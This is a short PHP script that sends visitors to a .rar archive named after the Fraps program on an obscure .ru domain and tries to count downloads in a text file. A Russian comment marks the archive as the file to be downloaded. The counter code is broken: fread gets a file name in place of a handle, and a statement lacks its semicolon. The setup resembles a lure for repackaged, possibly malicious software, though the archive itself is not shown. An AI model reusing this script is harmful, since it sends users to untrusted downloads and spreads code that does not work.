<?php
if (isset($_GET['do']))
{

header("location: https://ofeligtelemsbasda2.ru/kim/fraps.3.5.99.rus.rar"); //Это файл, который нужно скачать
$chislo = fread("1.txt") + 1;
file_put_contents("1.txt", $chislo, LOCK_EX)

}
?>